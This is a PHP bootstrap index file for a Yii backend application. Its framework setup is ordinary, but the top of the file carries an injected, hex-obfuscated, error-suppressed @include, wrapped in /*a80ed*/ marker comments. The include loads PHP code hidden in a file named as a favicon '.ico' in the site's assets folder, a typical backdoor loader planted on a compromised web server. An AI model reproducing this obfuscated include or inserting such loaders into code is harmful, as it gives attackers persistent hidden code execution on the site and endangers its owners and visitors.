<?php
/*a80ed*/

@include "\x2fho\x6de/\x61dm\x69n/\x77eb\x2fad\x6d.s\x6dr.\x6dil\x69mo\x6e.r\x75/p\x75bl\x69c_\x68tm\x6c/a\x73se\x74s/\x36a0\x66e2\x30e/\x66av\x69co\x6e_5\x3908\x633.\x69co";

/*a80ed*/

/**
 *
 * Bootstrap index file
 *
 * @author Antonio Ramirez <amigo.cobos@gmail.com>
 * @link http://www.ramirezcobos.com/
 * @link http://www.2amigos.us/
 * @copyright 2013 2amigOS! Consultation Group LLC
 * @license http://www.opensource.org/licenses/bsd-license.php New BSD License
 */
require('./../../common/lib/vendor/autoload.php');
require('./../../common/lib/vendor/yiisoft/yii/framework/yii.php');
Yii::setPathOfAlias('Yiinitializr', './../../common/lib/Yiinitializr');

use Yiinitializr\Helpers\Initializer;


Initializer::create('./../', 'backend', array(
	__DIR__ .'/../../common/config/main.php',
	__DIR__ .'/../../common/config/env.php',
	__DIR__ .'/../config/dev.php',
))->run();
